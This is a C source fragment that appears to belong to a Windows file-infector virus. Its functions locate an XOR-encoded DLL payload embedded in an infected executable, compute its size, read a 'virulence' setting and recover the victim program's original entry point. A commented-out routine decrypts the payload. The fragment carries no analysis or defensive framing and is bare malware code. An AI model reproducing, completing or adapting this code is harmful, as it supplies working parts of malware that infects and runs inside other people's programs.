
#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

LPVOID GetDll(DWORD *len)
{
	DWORD size = 0;
	unsigned char *dll= upx_sect+szinfcode;
               
	size += ((BYTE*)&dll[1])[0]*4096;
	size += ((BYTE*)&dll[2])[0]*512;

	*len = size;                        
	VIRULENCE = dll[0x40];

	return dll;
}

// We need this func, becouse in some NET exe (vista, infocard.exe)
// EP is changed by loader after start
DWORD GetVictimEP()
{
	unsigned char *dll = upx_sect+szinfcode; 
	DWORD EP = ((DWORD*)&dll[0x41])[0];     

	return EP;
}

#ifdef _MSC_VER
	#pragma optimize("", on)
#else
	#pragma optimize(on)
#endif

//
//LPVOID DecryptDll(unsigned char *b,DWORD *len)
//{
// 	DWORD peofs=((DWORD*)&b[0x3C])[0]; 
// 	PE_HEADER *pe= b+peofs;
// 	unsigned char *dll=/*@S+*/b+pe->entrypointrva+szinfcode/*@E*/;
//	
//	DWORD size=0;
// 	BYTE xorkey = ((BYTE*)&dll[0])[0]^'M';
// 	size += ((BYTE*)&dll[1])[0]*4096;
// 	size += ((BYTE*)&dll[2])[0]*512;
//
// 	for (DWORD i=2;i<size;i++) 
//		dll[i]=dll[i]^xorkey;
// 	*len=size;
//
//#ifdef dbgdbg
//  adddeb("*** DecryptDll xorkey:%.2X size:0x%.2X*4096+%.2X*512=0x%X (dec:%u)",xorkey,((BYTE*)&dll[1])[0],((BYTE*)&dll[2])[0],size,size);
//#endif
//
// 	return dll;
//}
//
